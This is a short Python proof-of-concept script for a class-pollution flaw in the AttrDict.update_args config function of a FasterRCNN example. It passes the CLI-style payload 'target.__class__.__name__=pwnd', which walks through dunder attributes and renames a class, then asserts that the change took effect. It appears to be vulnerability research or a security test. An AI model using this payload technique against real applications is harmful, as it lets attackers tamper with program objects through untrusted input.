# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Local Trigger
# Class Pollution Func: AttrDict.update_args (via CLI)
# Type: get-attr-set-attr
# Trigger: python train.py target.__class__.__name__=pwnd

import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'library', 'repo', 'examples', 'FasterRCNN'))

from config import config as cfg

class Target: pass
target = Target()
cfg.target = target

payload_value = "pwnd"

def run_poc():
  # Simulates CLI: python train.py target.__class__.__name__=pwnd
  cli_args = ["target.__class__.__name__=" + payload_value]
  cfg.update_args(cli_args)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified! (local trigger)")

if __name__ == "__main__":
  verify_poc()
